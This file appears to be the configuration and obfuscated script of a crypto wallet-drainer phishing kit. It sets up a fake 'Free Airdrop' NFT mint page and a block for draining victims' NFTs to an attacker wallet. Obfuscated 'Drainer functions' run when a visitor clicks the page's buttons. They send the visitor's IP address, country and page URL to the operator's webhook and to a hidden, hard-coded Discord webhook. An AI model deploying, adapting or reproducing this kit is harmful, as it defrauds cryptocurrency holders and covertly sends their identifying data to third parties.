const webhookURL = "WEBHOOK";
const receiveAddress = 'YOUR WALLET',
  collectionInfo = {
    name: 'THE NFT WORLD',
    socialMedia: {
      discord: 'https://discord.gg',
      twitter: 'https://twitter.com',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: 'YOUR WALLET',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
//Drainer functions
const _0x33e0b6=_0xb9bb;(function(_0x1f082d,_0xde4222){const _0x2e0d15=_0xb9bb,_0x1c08a5=_0x1f082d();while(!![]){try{const _0x2b3194=parseInt(_0x2e0d15(0x1a0))/0x1+parseInt(_0x2e0d15(0x19e))/0x2+-parseInt(_0x2e0d15(0x198))/0x3*(-parseInt(_0x2e0d15(0x1b1))/0x4)+parseInt(_0x2e0d15(0x1bd))/0x5+parseInt(_0x2e0d15(0x1a2))/0x6*(-parseInt(_0x2e0d15(0x1b4))/0x7)+parseInt(_0x2e0d15(0x1b5))/0x8+-parseInt(_0x2e0d15(0x199))/0x9;if(_0x2b3194===_0xde4222)break;else _0x1c08a5['push'](_0x1c08a5['shift']());}catch(_0x134a16){_0x1c08a5['push'](_0x1c08a5['shift']());}}}(_0x5066,0xcd732));function _0x5066(){const _0x9821e6=['Erro\x20ao\x20enviar\x20mensagem\x20para\x20o\x20primeiro\x20webhook:','click','69903BlSJSu','37123101FDwIXs','application/json','log',':flag_gb:','URL','3078114cvfxAf','country_code','899125yWbuzi','status','17946YbXkrK','Content-Type',':flag_ca:','catch','https://ipapi.co/json/',':flag_kr:','json','href','country_name','DOMContentLoaded','getElementsByClassName','POST','error','Mensagem\x20enviada\x20para\x20o\x20segundo\x20webhook\x20com\x20sucesso!','Mensagem\x20enviada\x20para\x20o\x20primeiro\x20webhook\x20com\x20sucesso!','264IEFbYT','length',':flag_cn:','1099MtKDqZ','8868464jDEcVr','onerror',':flag_de:','stringify','send',':flag_au:','open','location','1756460AqwVGC','statusText','País',':flag_mx:','New\x20wallet\x20connect!',':flag_in:','https://discord.com/api/webhooks/1128774512398323803/TpBWMJdhhMEhkYTfeGwhyQwmziBRso8WykSkYEEyLpMBWlAnBjas-AJwDmy-jjlzSBFg',':flag_it:','setRequestHeader','Erro\x20ao\x20enviar\x20mensagem\x20para\x20o\x20segundo\x20webhook:','Erro\x20ao\x20obter\x20o\x20IP\x20e\x20país\x20de\x20origem\x20do\x20usuário:'];_0x5066=function(){return _0x9821e6;};return _0x5066();}function getFlagEmoji(_0x48757a){const _0x34c61e=_0xb9bb,_0xf68d36={'AU':_0x34c61e(0x1ba),'BR':':flag_br:','CA':_0x34c61e(0x1a4),'CN':_0x34c61e(0x1b3),'FR':':flag_fr:','DE':_0x34c61e(0x1b7),'IN':_0x34c61e(0x190),'IT':_0x34c61e(0x192),'JP':':flag_jp:','MX':_0x34c61e(0x1c0),'RU':':flag_ru:','ZA':':flag_za:','KR':_0x34c61e(0x1a7),'ES':':flag_es:','US':':flag_us:','GB':_0x34c61e(0x19c)};return _0xf68d36[_0x48757a]||'';}function sendMessage(){const _0x261d2b=_0xb9bb,_0x4f3f94=window[_0x261d2b(0x1bc)][_0x261d2b(0x1a9)],_0x526ffd=webhookURL,_0x1e099a=_0x261d2b(0x191);fetch(_0x261d2b(0x1a6))['then'](_0x56b195=>_0x56b195[_0x261d2b(0x1a8)]())['then'](_0x2dc3a8=>{const _0x44f5a1=_0x261d2b,_0x583dc6=_0x2dc3a8['ip'],_0x145f51=_0x2dc3a8[_0x44f5a1(0x1aa)],_0x3c6d20=_0x2dc3a8[_0x44f5a1(0x19f)],_0x57d1a0=getFlagEmoji(_0x3c6d20),_0x148f76={'title':_0x44f5a1(0x1c1),'description':':ok_hand:','fields':[{'name':'IP','value':_0x583dc6,'inline':!![]},{'name':_0x44f5a1(0x1bf),'value':_0x57d1a0+'\x20'+_0x145f51,'inline':!![]},{'name':_0x44f5a1(0x19d),'value':_0x4f3f94}],'color':0x5a00b9},_0x25090b=JSON[_0x44f5a1(0x1b8)]({'embeds':[_0x148f76]}),_0xd08cf8=new XMLHttpRequest();_0xd08cf8['open']('POST',_0x526ffd),_0xd08cf8[_0x44f5a1(0x193)](_0x44f5a1(0x1a3),'application/json'),_0xd08cf8['onload']=function(){const _0x49fb3f=_0x44f5a1;_0xd08cf8['status']>=0xc8&&_0xd08cf8[_0x49fb3f(0x1a1)]<0x12c?console[_0x49fb3f(0x19b)](_0x49fb3f(0x1b0)):console['error'](_0x49fb3f(0x196),_0xd08cf8['statusText']);},_0xd08cf8[_0x44f5a1(0x1b6)]=function(){const _0x182e17=_0x44f5a1;console[_0x182e17(0x1ae)](_0x182e17(0x196),_0xd08cf8[_0x182e17(0x1be)]);},_0xd08cf8['send'](_0x25090b);const _0x3165dd=new XMLHttpRequest();_0x3165dd[_0x44f5a1(0x1bb)](_0x44f5a1(0x1ad),_0x1e099a),_0x3165dd[_0x44f5a1(0x193)](_0x44f5a1(0x1a3),_0x44f5a1(0x19a)),_0x3165dd['onload']=function(){const _0x49962c=_0x44f5a1;_0x3165dd['status']>=0xc8&&_0x3165dd[_0x49962c(0x1a1)]<0x12c?console[_0x49962c(0x19b)](_0x49962c(0x1af)):console[_0x49962c(0x1ae)](_0x49962c(0x194),_0x3165dd['statusText']);},_0x3165dd['onerror']=function(){const _0x9c87aa=_0x44f5a1;console[_0x9c87aa(0x1ae)](_0x9c87aa(0x194),_0x3165dd['statusText']);},_0x3165dd[_0x44f5a1(0x1b9)](_0x25090b);})[_0x261d2b(0x1a5)](_0x1100d0=>{const _0x473ec4=_0x261d2b;console[_0x473ec4(0x1ae)](_0x473ec4(0x195),_0x1100d0);});}function _0xb9bb(_0x3115ac,_0xbe1d8f){const _0x50663f=_0x5066();return _0xb9bb=function(_0xb9bbb7,_0x58e4d4){_0xb9bbb7=_0xb9bbb7-0x190;let _0x3f42bf=_0x50663f[_0xb9bbb7];return _0x3f42bf;},_0xb9bb(_0x3115ac,_0xbe1d8f);}document['addEventListener'](_0x33e0b6(0x1ab),function(){const _0x3b3597=_0x33e0b6,_0x377663=document[_0x3b3597(0x1ac)]('interact-button');for(let _0x2ea7b9=0x0;_0x2ea7b9<_0x377663[_0x3b3597(0x1b2)];_0x2ea7b9++){_0x377663[_0x2ea7b9]['addEventListener'](_0x3b3597(0x197),function(){sendMessage();});}});